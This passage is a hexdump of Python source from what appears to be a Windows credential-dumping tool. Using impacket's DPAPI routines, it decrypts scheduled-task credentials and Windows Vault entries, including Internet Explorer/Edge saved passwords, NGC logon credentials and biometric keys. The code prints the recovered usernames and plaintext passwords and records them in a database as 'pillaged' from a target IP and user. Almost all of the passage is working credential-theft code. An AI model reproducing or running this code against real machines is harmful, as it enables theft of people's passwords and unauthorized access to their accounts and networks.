+00010970: 6c6f 6767 696e 672e 6465 6275 6728 6465  logging.debug(de
+00010980: 6372 7970 7465 645f 626c 6f62 290a 0909  crypted_blob)...
+00010990: 0969 6e66 6f20 3d20 225c 6e22 0a09 0909  .info = "\n"....
+000109a0: 696e 666f 202b 3d20 6622 5b43 5245 4445  info += f"[CREDE
+000109b0: 4e54 4941 4c5d 5c6e 220a 0909 0974 7279  NTIAL]\n"....try
+000109c0: 3a0a 0909 0909 696e 666f 202b 3d20 6622  :.....info += f"
+000109d0: 4c61 7374 5772 6974 7465 6e20 3a20 7b64  LastWritten : {d
+000109e0: 6174 6574 696d 652e 7574 6366 726f 6d74  atetime.utcfromt
+000109f0: 696d 6573 7461 6d70 2869 6d70 6163 6b65  imestamp(impacke
+00010a00: 742e 6470 6170 692e 6765 7455 6e69 7854  t.dpapi.getUnixT
+00010a10: 696d 6528 6465 6372 7970 7465 645f 626c  ime(decrypted_bl
+00010a20: 6f62 5b27 4c61 7374 5772 6974 7465 6e27  ob['LastWritten'
+00010a30: 5d29 297d 5c6e 220a 0909 0909 696e 666f  ]))}\n".....info
+00010a40: 202b 3d20 6622 466c 6167 7320 2020 2020   += f"Flags     
+00010a50: 2020 3a20 7b64 6563 7279 7074 6564 5f62    : {decrypted_b
+00010a60: 6c6f 625b 2746 6c61 6773 275d 7d20 287b  lob['Flags']} ({
+00010a70: 696d 7061 636b 6574 2e64 7061 7069 2e67  impacket.dpapi.g
+00010a80: 6574 466c 6167 7328 696d 7061 636b 6574  etFlags(impacket
+00010a90: 2e64 7061 7069 2e43 5245 4445 4e54 4941  .dpapi.CREDENTIA
+00010aa0: 4c5f 464c 4147 532c 2064 6563 7279 7074  L_FLAGS, decrypt
+00010ab0: 6564 5f62 6c6f 625b 2746 6c61 6773 275d  ed_blob['Flags']
+00010ac0: 297d 295c 6e22 0a09 0909 0969 6e66 6f20  )})\n".....info 
+00010ad0: 2b3d 2066 2250 6572 7369 7374 2020 2020  += f"Persist    
+00010ae0: 203a 2030 787b 6465 6372 7970 7465 645f   : 0x{decrypted_
+00010af0: 626c 6f62 5b27 5065 7273 6973 7427 5d7d  blob['Persist']}
+00010b00: 2028 7b69 6d70 6163 6b65 742e 6470 6170   ({impacket.dpap
+00010b10: 692e 4352 4544 454e 5449 414c 5f50 4552  i.CREDENTIAL_PER
+00010b20: 5349 5354 2864 6563 7279 7074 6564 5f62  SIST(decrypted_b
+00010b30: 6c6f 625b 2750 6572 7369 7374 275d 292e  lob['Persist']).
+00010b40: 6e61 6d65 7d29 5c6e 220a 0909 0909 696e  name})\n".....in
+00010b50: 666f 202b 3d20 6622 5479 7065 2020 2020  fo += f"Type    
+00010b60: 2020 2020 3a20 3078 7b64 6563 7279 7074      : 0x{decrypt
+00010b70: 6564 5f62 6c6f 625b 2754 7970 6527 5d7d  ed_blob['Type']}
+00010b80: 2028 7b69 6d70 6163 6b65 742e 6470 6170   ({impacket.dpap
+00010b90: 692e 4352 4544 454e 5449 414c 5f50 4552  i.CREDENTIAL_PER
+00010ba0: 5349 5354 2864 6563 7279 7074 6564 5f62  SIST(decrypted_b
+00010bb0: 6c6f 625b 2754 7970 6527 5d29 2e6e 616d  lob['Type']).nam
+00010bc0: 657d 295c 6e22 0a09 0909 6578 6365 7074  e})\n"....except
+00010bd0: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
+00010be0: 3a0a 0909 0909 7365 6c66 2e6c 6f67 6769  :.....self.loggi
+00010bf0: 6e67 2e64 6562 7567 280a 0909 0909 0966  ng.debug(......f
+00010c00: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
+00010c10: 7461 7267 6574 5f69 707d 5d20 7b62 636f  target_ip}] {bco
+00010c20: 6c6f 7273 2e57 4152 4e49 4e47 7d45 7863  lors.WARNING}Exc
+00010c30: 6570 7469 6f6e 2031 2064 6563 7279 7074  eption 1 decrypt
+00010c40: 6564 5f62 6c6f 622e 6174 7472 6962 7574  ed_blob.attribut
+00010c50: 6573 207b 6263 6f6c 6f72 732e 454e 4443  es {bcolors.ENDC
+00010c60: 7d22 290a 0909 0909 7365 6c66 2e6c 6f67  }").....self.log
+00010c70: 6769 6e67 2e64 6562 7567 2865 7829 0a09  ging.debug(ex)..
+00010c80: 0909 696e 666f 202b 3d20 6622 5461 7267  ..info += f"Targ
+00010c90: 6574 2020 2020 2020 3a20 7b64 6563 7279  et      : {decry
+00010ca0: 7074 6564 5f62 6c6f 625b 2754 6172 6765  pted_blob['Targe
+00010cb0: 7427 5d2e 6465 636f 6465 2827 7574 662d  t'].decode('utf-
+00010cc0: 3136 6c65 2729 7d5c 6e22 0a09 0909 696e  16le')}\n"....in
+00010cd0: 666f 202b 3d20 6622 4465 7363 7269 7074  fo += f"Descript
+00010ce0: 696f 6e20 3a20 7b64 6563 7279 7074 6564  ion : {decrypted
+00010cf0: 5f62 6c6f 625b 2744 6573 6372 6970 7469  _blob['Descripti
+00010d00: 6f6e 275d 2e64 6563 6f64 6528 2775 7466  on'].decode('utf
+00010d10: 2d31 366c 6527 297d 5c6e 220a 0909 0969  -16le')}\n"....i
+00010d20: 6e66 6f20 2b3d 2066 2255 6e6b 6e6f 776e  nfo += f"Unknown
+00010d30: 2020 2020 203a 207b 6465 6372 7970 7465       : {decrypte
+00010d40: 645f 626c 6f62 5b27 556e 6b6e 6f77 6e27  d_blob['Unknown'
+00010d50: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
+00010d60: 6c65 2729 7d5c 6e22 0a09 0909 696e 666f  le')}\n"....info
+00010d70: 202b 3d20 6622 5573 6572 6e61 6d65 2020   += f"Username  
+00010d80: 2020 3a20 7b64 6563 7279 7074 6564 5f62    : {decrypted_b
+00010d90: 6c6f 625b 2755 7365 726e 616d 6527 5d2e  lob['Username'].
+00010da0: 6465 636f 6465 2827 7574 662d 3136 6c65  decode('utf-16le
+00010db0: 2729 7d5c 6e22 0a09 0909 7472 793a 0a09  ')}\n"....try:..
+00010dc0: 0909 0969 6e66 6f20 2b3d 2066 2255 6e6b  ...info += f"Unk
+00010dd0: 6e6f 776e 3320 2020 2020 3a20 7b64 6563  nown3     : {dec
+00010de0: 7279 7074 6564 5f62 6c6f 625b 2755 6e6b  rypted_blob['Unk
+00010df0: 6e6f 776e 3327 5d2e 6465 636f 6465 2827  nown3'].decode('
+00010e00: 7574 662d 3136 6c65 2729 7d5c 6e22 0a09  utf-16le')}\n"..
+00010e10: 0909 0970 6173 7377 6f72 6420 3d20 6465  ...password = de
+00010e20: 6372 7970 7465 645f 626c 6f62 5b27 556e  crypted_blob['Un
+00010e30: 6b6e 6f77 6e33 275d 2e64 6563 6f64 6528  known3'].decode(
+00010e40: 2775 7466 2d31 366c 6527 290a 0909 0965  'utf-16le')....e
+00010e50: 7863 6570 7420 556e 6963 6f64 6544 6563  xcept UnicodeDec
+00010e60: 6f64 6545 7272 6f72 3a0a 0909 0909 696e  odeError:.....in
+00010e70: 666f 202b 3d20 6622 556e 6b6e 6f77 6e33  fo += f"Unknown3
+00010e80: 2e20 2020 2020 3a20 7b64 6563 7279 7074  .     : {decrypt
+00010e90: 6564 5f62 6c6f 625b 2755 6e6b 6e6f 776e  ed_blob['Unknown
+00010ea0: 3327 5d2e 6465 636f 6465 2827 6c61 7469  3'].decode('lati
+00010eb0: 6e2d 3127 297d 5c6e 220a 0909 0909 7061  n-1')}\n".....pa
+00010ec0: 7373 776f 7264 203d 2064 6563 7279 7074  ssword = decrypt
+00010ed0: 6564 5f62 6c6f 625b 2755 6e6b 6e6f 776e  ed_blob['Unknown
+00010ee0: 3327 5d2e 6465 636f 6465 2827 6c61 7469  3'].decode('lati
+00010ef0: 6e2d 3127 290a 0909 0923 2323 2323 2323  n-1')....#######
+00010f00: 2323 2323 2350 524f 4345 5353 494e 4720  #####PROCESSING 
+00010f10: 4441 5441 0a09 0909 7365 6c66 2e64 622e  DATA....self.db.
+00010f20: 6164 645f 6372 6564 7a28 6372 6564 7a5f  add_credz(credz_
+00010f30: 7479 7065 3d27 7461 736b 7363 6865 6475  type='taskschedu
+00010f40: 6c65 7227 2c0a 0909 0909 0909 0920 2063  ler',........  c
+00010f50: 7265 647a 5f75 7365 726e 616d 653d 6465  redz_username=de
+00010f60: 6372 7970 7465 645f 626c 6f62 5b27 5573  crypted_blob['Us
+00010f70: 6572 6e61 6d65 275d 2e64 6563 6f64 6528  ername'].decode(
+00010f80: 2775 7466 2d31 366c 6527 292c 0a09 0909  'utf-16le'),....
+00010f90: 0909 0909 2020 6372 6564 7a5f 7061 7373  ....  credz_pass
+00010fa0: 776f 7264 3d70 6173 7377 6f72 642c 0a09  word=password,..
+00010fb0: 0909 0909 0909 2020 6372 6564 7a5f 7461  ......  credz_ta
+00010fc0: 7267 6574 3d64 6563 7279 7074 6564 5f62  rget=decrypted_b
+00010fd0: 6c6f 625b 2754 6172 6765 7427 5d2e 6465  lob['Target'].de
+00010fe0: 636f 6465 2827 7574 662d 3136 6c65 2729  code('utf-16le')
+00010ff0: 2c0a 0909 0909 0909 0920 2063 7265 647a  ,........  credz
+00011000: 5f70 6174 683d 6c6f 6361 6c66 696c 652c  _path=localfile,
+00011010: 0a09 0909 0909 0909 2020 7069 6c6c 6167  ........  pillag
+00011020: 6564 5f66 726f 6d5f 636f 6d70 7574 6572  ed_from_computer
+00011030: 5f69 703d 7365 6c66 2e6f 7074 696f 6e73  _ip=self.options
+00011040: 2e74 6172 6765 745f 6970 2c0a 0909 0909  .target_ip,.....
+00011050: 0909 0920 2070 696c 6c61 6765 645f 6672  ...  pillaged_fr
+00011060: 6f6d 5f75 7365 726e 616d 653d 7573 6572  om_username=user
+00011070: 2e75 7365 726e 616d 6529 0a09 0909 7365  .username)....se
+00011080: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00011090: 2869 6e66 6f29 0a09 0909 7265 7475 726e  (info)....return
+000110a0: 2069 6e66 6f0a 0909 6578 6365 7074 2045   info...except E
+000110b0: 7863 6570 7469 6f6e 2061 7320 6578 3a0a  xception as ex:.
+000110c0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+000110d0: 6465 6275 6728 0a09 0909 0966 225b 7b73  debug(.....f"[{s
+000110e0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+000110f0: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
+00011100: 2e57 4152 4e49 4e47 7d45 7863 6570 7469  .WARNING}Excepti
+00011110: 6f6e 2033 2064 756d 705f 6372 6564 656e  on 3 dump_creden
+00011120: 7469 616c 5f62 6c6f 6220 7b62 636f 6c6f  tial_blob {bcolo
+00011130: 7273 2e45 4e44 437d 2229 0a09 0909 7365  rs.ENDC}")....se
+00011140: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00011150: 2865 7829 0a0a 0964 6566 2070 726f 6365  (ex)...def proce
+00011160: 7373 5f64 6563 7279 7074 6564 5f76 6175  ss_decrypted_vau
+00011170: 6c74 2873 656c 662c 2075 7365 722c 2073  lt(self, user, s
+00011180: 6563 7265 745f 6669 6c65 293a 2020 2320  ecret_file):  # 
+00011190: 6461 7461 202c 7573 6572 202c 6c6f 6361  data ,user ,loca
+000111a0: 6c66 696c 652c 626c 6f62 5f74 7970 652c  lfile,blob_type,
+000111b0: 6172 6773 3d5b 5d29 3a0a 0909 7472 793a  args=[]):...try:
+000111c0: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+000111d0: 2e64 6562 7567 280a 0909 0909 6622 5b7b  .debug(.....f"[{
+000111e0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+000111f0: 6765 745f 6970 7d5d 205b 2b5d 2070 726f  get_ip}] [+] pro
+00011200: 6365 7373 5f64 6563 7279 7074 6564 5f76  cess_decrypted_v
+00011210: 6175 6c74 206f 6620 7b73 6563 7265 745f  ault of {secret_
+00011220: 6669 6c65 7d20 7b62 636f 6c6f 7273 2e45  file} {bcolors.E
+00011230: 4e44 437d 2229 0a09 0909 626c 6f62 5f74  NDC}")....blob_t
+00011240: 7970 6520 3d20 7365 6372 6574 5f66 696c  ype = secret_fil
+00011250: 655b 2774 7970 6527 5d0a 0909 096c 6f63  e['type']....loc
+00011260: 616c 6669 6c65 203d 2073 6563 7265 745f  alfile = secret_
+00011270: 6669 6c65 5b27 7061 7468 275d 0a09 0909  file['path']....
+00011280: 6461 7461 203d 2073 6563 7265 745f 6669  data = secret_fi
+00011290: 6c65 5b27 6461 7461 275d 0a0a 0909 0969  le['data'].....i
+000112a0: 6620 626c 6f62 5f74 7970 6520 3d3d 2027  f blob_type == '
+000112b0: 7661 756c 7427 206f 7220 626c 6f62 5f74  vault' or blob_t
+000112c0: 7970 6520 3d3d 2027 7663 7264 273a 0a09  ype == 'vcrd':..
+000112d0: 0909 0974 7279 3a0a 0909 0909 0976 6175  ...try:......vau
+000112e0: 6c74 5f6e 616d 6520 3d20 7365 6372 6574  lt_name = secret
+000112f0: 5f66 696c 655b 2776 6175 6c74 5f6e 616d  _file['vault_nam
+00011300: 6527 5d20 2023 2061 7267 735b 305d 0a09  e']  # args[0]..
+00011310: 0909 0909 7661 756c 745f 7479 7065 203d  ....vault_type =
+00011320: 2073 6563 7265 745f 6669 6c65 5b27 7661   secret_file['va
+00011330: 756c 745f 7479 7065 275d 2020 2320 6172  ult_type']  # ar
+00011340: 6773 5b31 5d0a 0909 0909 0973 656c 662e  gs[1]......self.
+00011350: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
+00011360: 5072 6f63 6573 7369 6e67 2056 6175 6c74  Processing Vault
+00011370: 207b 7661 756c 745f 6e61 6d65 7d20 2d20   {vault_name} - 
+00011380: 7479 7065 203a 207b 7661 756c 745f 7479  type : {vault_ty
+00011390: 7065 7d20 2229 0a09 0909 0909 6966 2076  pe} ")......if v
+000113a0: 6175 6c74 5f74 7970 6520 3d3d 2027 5769  ault_type == 'Wi
+000113b0: 6e42 696f 204b 6579 273a 0a09 0909 0909  nBio Key':......
+000113c0: 0964 6174 6120 3d20 7365 6c66 2e64 756d  .data = self.dum
+000113d0: 705f 5641 554c 545f 5749 4e5f 4249 4f5f  p_VAULT_WIN_BIO_
+000113e0: 4b45 5928 7573 6572 2c20 6c6f 6361 6c66  KEY(user, localf
+000113f0: 696c 652c 2064 6174 6129 0a09 0909 0909  ile, data)......
+00011400: 0973 656c 662e 6c6f 6773 6563 7265 7428  .self.logsecret(
+00011410: 6622 5661 756c 7420 7b76 6175 6c74 5f6e  f"Vault {vault_n
+00011420: 616d 657d 203a 207b 6461 7461 7d20 2229  ame} : {data} ")
+00011430: 0a09 0909 0909 656c 6966 2076 6175 6c74  ......elif vault
+00011440: 5f74 7970 6520 3d3d 2027 4e47 4320 4c6f  _type == 'NGC Lo
+00011450: 6361 6c20 4163 636f 756e 7420 4c6f 676f  cal Account Logo
+00011460: 6e20 5661 756c 7420 4372 6564 656e 7469  n Vault Credenti
+00011470: 616c 273a 0a09 0909 0909 0964 6174 6120  al':.......data 
+00011480: 3d20 7365 6c66 2e64 756d 705f 5641 554c  = self.dump_VAUL
+00011490: 545f 4e47 435f 4c4f 4341 4c5f 4143 434f  T_NGC_LOCAL_ACCO
+000114a0: 4f55 4e54 2875 7365 722c 206c 6f63 616c  OUNT(user, local
+000114b0: 6669 6c65 2c20 6461 7461 290a 0909 0909  file, data).....
+000114c0: 0909 7365 6c66 2e6c 6f67 7365 6372 6574  ..self.logsecret
+000114d0: 2866 2256 6175 6c74 207b 7661 756c 745f  (f"Vault {vault_
+000114e0: 6e61 6d65 7d20 3a20 7b64 6174 617d 2022  name} : {data} "
+000114f0: 290a 0909 0909 0965 6c69 6620 224e 4743  )......elif "NGC
+00011500: 2220 696e 2076 6175 6c74 5f74 7970 653a  " in vault_type:
+00011510: 0a09 0909 0909 0964 6174 6120 3d20 7365  .......data = se
+00011520: 6c66 2e64 756d 705f 5641 554c 545f 4e47  lf.dump_VAULT_NG
+00011530: 435f 4143 434f 4f55 4e54 2875 7365 722c  C_ACCOOUNT(user,
+00011540: 206c 6f63 616c 6669 6c65 2c20 6461 7461   localfile, data
+00011550: 290a 0909 0909 0909 7365 6c66 2e6c 6f67  ).......self.log
+00011560: 7365 6372 6574 2866 2256 6175 6c74 207b  secret(f"Vault {
+00011570: 7661 756c 745f 6e61 6d65 7d20 3a20 7b64  vault_name} : {d
+00011580: 6174 617d 2022 290a 0909 0909 0965 6c69  ata} ")......eli
+00011590: 6620 7661 756c 745f 7479 7065 203d 3d20  f vault_type == 
+000115a0: 2749 6e74 6572 6e65 7420 4578 706c 6f72  'Internet Explor
+000115b0: 6572 273a 0a09 0909 0909 0964 6174 6120  er':.......data 
+000115c0: 3d20 7365 6c66 2e64 756d 705f 5641 554c  = self.dump_VAUL
+000115d0: 545f 494e 5445 524e 4554 5f45 5850 4c4f  T_INTERNET_EXPLO
+000115e0: 5245 5228 7573 6572 2c20 6c6f 6361 6c66  RER(user, localf
+000115f0: 696c 652c 2064 6174 6129 0a0a 0909 0909  ile, data)......
+00011600: 0923 2075 7365 722e 7365 6372 6574 735b  .# user.secrets[
+00011610: 2256 6175 6c74 3a25 7322 2025 2076 6175  "Vault:%s" % vau
+00011620: 6c74 5f6e 616d 655d 203d 2064 6174 610a  lt_name] = data.
+00011630: 0909 0909 0973 6563 7265 745f 6669 6c65  .....secret_file
+00011640: 5b27 7365 6372 6574 275d 203d 2064 6174  ['secret'] = dat
+00011650: 610a 0909 0909 0973 656c 662e 6475 6d70  a......self.dump
+00011660: 5f74 6f5f 6669 6c65 286c 6f63 616c 6669  _to_file(localfi
+00011670: 6c65 2c20 6461 7461 290a 0909 0909 6578  le, data).....ex
+00011680: 6365 7074 2045 7863 6570 7469 6f6e 2061  cept Exception a
+00011690: 7320 6578 3a0a 0909 0909 0973 656c 662e  s ex:......self.
+000116a0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+000116b0: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+000116c0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+000116d0: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
+000116e0: 4e47 7d45 7863 6570 7420 3120 7072 6f63  NG}Except 1 proc
+000116f0: 6573 735f 6465 6372 7970 7465 645f 6461  ess_decrypted_da
+00011700: 7461 2056 6175 6c74 2066 6f72 207b 6c6f  ta Vault for {lo
+00011710: 6361 6c66 696c 657d 207b 6263 6f6c 6f72  calfile} {bcolor
+00011720: 732e 454e 4443 7d22 290a 0909 0909 0973  s.ENDC}")......s
+00011730: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00011740: 6728 6578 290a 0909 6578 6365 7074 2045  g(ex)...except E
+00011750: 7863 6570 7469 6f6e 2061 7320 6578 3a0a  xception as ex:.
+00011760: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00011770: 6465 6275 6728 0a09 0909 0966 225b 7b73  debug(.....f"[{s
+00011780: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00011790: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
+000117a0: 2e57 4152 4e49 4e47 7d45 7863 6570 7420  .WARNING}Except 
+000117b0: 3220 7072 6f63 6573 735f 6465 6372 7970  2 process_decryp
+000117c0: 7465 645f 6461 7461 2041 4c4c 2066 6f72  ted_data ALL for
+000117d0: 207b 6c6f 6361 6c66 696c 657d 207b 6263   {localfile} {bc
+000117e0: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+000117f0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00011800: 6275 6728 6578 290a 0a09 6465 6620 6475  bug(ex)...def du
+00011810: 6d70 5f56 4155 4c54 5f49 4e54 4552 4e45  mp_VAULT_INTERNE
+00011820: 545f 4558 504c 4f52 4552 2873 656c 662c  T_EXPLORER(self,
+00011830: 2075 7365 722c 206c 6f63 616c 6669 6c65   user, localfile
+00011840: 2c20 7661 756c 745f 626c 6f62 293a 0a09  , vault_blob):..
+00011850: 0974 7279 3a0a 0909 0973 656c 662e 6c6f  .try:....self.lo
+00011860: 6767 696e 672e 6465 6275 6728 2246 6f72  gging.debug("For
+00011870: 6d61 7469 6e67 2056 4155 4c54 5f49 4e54  mating VAULT_INT
+00011880: 4552 4e45 545f 4558 504c 4f52 4552 2069  ERNET_EXPLORER i
+00011890: 6e66 6f22 290a 0909 0972 6574 7661 6c20  nfo")....retval 
+000118a0: 3d20 225b 496e 7465 726e 6574 2045 7870  = "[Internet Exp
+000118b0: 6c6f 7265 725d 5c6e 220a 0909 0972 6574  lorer]\n"....ret
+000118c0: 7661 6c20 2b3d 2066 2255 7365 726e 616d  val += f"Usernam
+000118d0: 6520 2020 2020 2020 203a 207b 7661 756c  e        : {vaul
+000118e0: 745f 626c 6f62 5b27 5573 6572 6e61 6d65  t_blob['Username
+000118f0: 275d 2e64 6563 6f64 6528 2775 7466 2d31  '].decode('utf-1
+00011900: 366c 6527 297d 205c 6e22 0a09 0909 7265  6le')} \n"....re
+00011910: 7476 616c 202b 3d20 6622 5265 736f 7572  tval += f"Resour
+00011920: 6365 2020 2020 2020 2020 3a20 7b76 6175  ce        : {vau
+00011930: 6c74 5f62 6c6f 625b 2752 6573 6f75 7263  lt_blob['Resourc
+00011940: 6527 5d2e 6465 636f 6465 2827 7574 662d  e'].decode('utf-
+00011950: 3136 6c65 2729 7d20 5c6e 220a 0909 0972  16le')} \n"....r
+00011960: 6574 7661 6c20 2b3d 2066 2250 6173 7377  etval += f"Passw
+00011970: 6f72 6420 2020 2020 2020 203a 207b 7661  ord        : {va
+00011980: 756c 745f 626c 6f62 5b27 5061 7373 776f  ult_blob['Passwo
+00011990: 7264 275d 2e64 6563 6f64 6528 2775 7466  rd'].decode('utf
+000119a0: 2d31 366c 6527 297d 203a 207b 6865 786c  -16le')} : {hexl
+000119b0: 6966 7928 7661 756c 745f 626c 6f62 5b27  ify(vault_blob['
+000119c0: 5061 7373 776f 7264 275d 297d 205c 6e22  Password'])} \n"
+000119d0: 0a09 0909 2323 2323 2323 2323 2323 2323  ....############
+000119e0: 5052 4f43 4553 5349 4e47 2044 4154 410a  PROCESSING DATA.
+000119f0: 0909 0973 656c 662e 6462 2e61 6464 5f63  ...self.db.add_c
+00011a00: 7265 647a 2863 7265 647a 5f74 7970 653d  redz(credz_type=
+00011a10: 2762 726f 7773 6572 2d69 6e74 6572 6e65  'browser-interne
+00011a20: 745f 6578 706c 6f72 6572 272c 0a09 0909  t_explorer',....
+00011a30: 0909 0909 2020 6372 6564 7a5f 7573 6572  ....  credz_user
+00011a40: 6e61 6d65 3d66 227b 7661 756c 745f 626c  name=f"{vault_bl
+00011a50: 6f62 5b27 5573 6572 6e61 6d65 275d 2e64  ob['Username'].d
+00011a60: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
+00011a70: 297d 222c 0a09 0909 0909 0909 2020 6372  )}",........  cr
+00011a80: 6564 7a5f 7061 7373 776f 7264 3d66 227b  edz_password=f"{
+00011a90: 7661 756c 745f 626c 6f62 5b27 5061 7373  vault_blob['Pass
+00011aa0: 776f 7264 275d 2e64 6563 6f64 6528 2775  word'].decode('u
+00011ab0: 7466 2d31 366c 6527 297d 222c 0a09 0909  tf-16le')}",....
+00011ac0: 0909 0909 2020 6372 6564 7a5f 7461 7267  ....  credz_targ
+00011ad0: 6574 3d66 227b 7661 756c 745f 626c 6f62  et=f"{vault_blob
+00011ae0: 5b27 5265 736f 7572 6365 275d 2e64 6563  ['Resource'].dec
+00011af0: 6f64 6528 2775 7466 2d31 366c 6527 297d  ode('utf-16le')}
+00011b00: 222c 0a09 0909 0909 0909 2020 6372 6564  ",........  cred
+00011b10: 7a5f 7061 7468 3d6c 6f63 616c 6669 6c65  z_path=localfile
+00011b20: 2c0a 0909 0909 0909 0920 2070 696c 6c61  ,........  pilla
+00011b30: 6765 645f 6672 6f6d 5f63 6f6d 7075 7465  ged_from_compute
+00011b40: 725f 6970 3d73 656c 662e 6f70 7469 6f6e  r_ip=self.option
+00011b50: 732e 7461 7267 6574 5f69 702c 0a09 0909  s.target_ip,....
+00011b60: 0909 0909 2020 7069 6c6c 6167 6564 5f66  ....  pillaged_f
+00011b70: 726f 6d5f 7573 6572 6e61 6d65 3d75 7365  rom_username=use
+00011b80: 722e 7573 6572 6e61 6d65 290a 0909 0973  r.username)....s
+00011b90: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
+00011ba0: 280a 0909 0909 6622 5b7b 7365 6c66 2e6f  (.....f"[{self.o
+00011bb0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+00011bc0: 7d5d 205b 2b5d 207b 6263 6f6c 6f72 732e  }] [+] {bcolors.
+00011bd0: 4f4b 4752 4545 4e7d 205b 4945 2f45 4447  OKGREEN} [IE/EDG
+00011be0: 4520 5061 7373 776f 7264 5d20 7b62 636f  E Password] {bco
+00011bf0: 6c6f 7273 2e45 4e44 437d 2066 6f72 207b  lors.ENDC} for {
+00011c00: 7661 756c 745f 626c 6f62 5b27 5265 736f  vault_blob['Reso
+00011c10: 7572 6365 275d 2e64 6563 6f64 6528 2775  urce'].decode('u
+00011c20: 7466 2d31 366c 6527 297d 205b 207b 6263  tf-16le')} [ {bc
+00011c30: 6f6c 6f72 732e 4f4b 424c 5545 7d7b 7661  olors.OKBLUE}{va
+00011c40: 756c 745f 626c 6f62 5b27 5573 6572 6e61  ult_blob['Userna
+00011c50: 6d65 275d 2e64 6563 6f64 6528 2775 7466  me'].decode('utf
+00011c60: 2d31 366c 6527 297d 203a 207b 7661 756c  -16le')} : {vaul
+00011c70: 745f 626c 6f62 5b27 5061 7373 776f 7264  t_blob['Password
+00011c80: 275d 2e64 6563 6f64 6528 2775 7466 2d31  '].decode('utf-1
+00011c90: 366c 6527 297d 7b62 636f 6c6f 7273 2e45  6le')}{bcolors.E
+00011ca0: 4e44 437d 205d 2229 0a09 0909 7265 7475  NDC} ]")....retu
+00011cb0: 726e 2072 6574 7661 6c0a 0909 6578 6365  rn retval...exce
+00011cc0: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
+00011cd0: 6578 3a0a 0909 0973 656c 662e 6c6f 6767  ex:....self.logg
+00011ce0: 696e 672e 6465 6275 6728 0a09 0909 0966  ing.debug(.....f
+00011cf0: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
+00011d00: 7461 7267 6574 5f69 707d 5d20 7b62 636f  target_ip}] {bco
+00011d10: 6c6f 7273 2e57 4152 4e49 4e47 7d45 7863  lors.WARNING}Exc
+00011d20: 6570 7469 6f6e 2064 756d 705f 5641 554c  eption dump_VAUL
+00011d30: 545f 494e 5445 524e 4554 5f45 5850 4c4f  T_INTERNET_EXPLO
+00011d40: 5245 527b 6263 6f6c 6f72 732e 454e 4443  RER{bcolors.ENDC
+00011d50: 7d22 290a 0909 0973 656c 662e 6c6f 6767  }")....self.logg
+00011d60: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
+00011d70: 6465 6620 6475 6d70 5f56 4155 4c54 5f57  def dump_VAULT_W
+00011d80: 494e 5f42 494f 5f4b 4559 2873 656c 662c  IN_BIO_KEY(self,
+00011d90: 2075 7365 722c 206c 6f63 616c 6669 6c65   user, localfile
+00011da0: 2c20 7661 756c 745f 626c 6f62 293a 0a09  , vault_blob):..
+00011db0: 0974 7279 3a0a 0909 0973 656c 662e 6c6f  .try:....self.lo
+00011dc0: 6767 696e 672e 6465 6275 6728 2244 756d  gging.debug("Dum
+00011dd0: 7069 6e67 2056 4155 4c54 5f57 494e 5f42  ping VAULT_WIN_B
+00011de0: 494f 5f4b 4559 2069 6e66 6f20 746f 2066  IO_KEY info to f
+00011df0: 696c 6522 290a 0909 0972 6574 7661 6c20  ile")....retval 
+00011e00: 3d20 225c 6e5b 5749 4e44 4f57 5320 4249  = "\n[WINDOWS BI
+00011e10: 4f4d 4554 5249 4320 4b45 595d 5c6e 220a  OMETRIC KEY]\n".
+00011e20: 0909 0972 6574 7661 6c20 2b3d 2027 5369  ...retval += 'Si
+00011e30: 6420 2020 2020 2020 2020 203a 2025 735c  d          : %s\
+00011e40: 6e27 2025 2052 5043 5f53 4944 2862 275c  n' % RPC_SID(b'\
+00011e50: 7830 355c 7830 305c 7830 305c 7830 3027  x05\x00\x00\x00'
+00011e60: 202b 2076 6175 6c74 5f62 6c6f 625b 2753   + vault_blob['S
+00011e70: 6964 275d 292e 666f 726d 6174 4361 6e6f  id']).formatCano
+00011e80: 6e69 6361 6c28 290a 0909 0972 6574 7661  nical()....retva
+00011e90: 6c20 2b3d 2066 2246 7269 656e 646c 7920  l += f"Friendly 
+00011ea0: 4e61 6d65 3a20 7b76 6175 6c74 5f62 6c6f  Name: {vault_blo
+00011eb0: 625b 274e 616d 6527 5d2e 6465 636f 6465  b['Name'].decode
+00011ec0: 2827 7574 662d 3136 6c65 2729 7d5c 6e22  ('utf-16le')}\n"
+00011ed0: 0a09 0909 7265 7476 616c 202b 3d20 6622  ....retval += f"
+00011ee0: 4269 6f6d 6574 7269 6320 4b65 793a 2030  Biometric Key: 0
+00011ef0: 787b 6865 786c 6966 7928 7661 756c 745f  x{hexlify(vault_
+00011f00: 626c 6f62 5b27 4269 6f4b 6579 275d 5b27  blob['BioKey']['
+00011f10: 624b 6579 275d 292e 6465 636f 6465 2827  bKey']).decode('
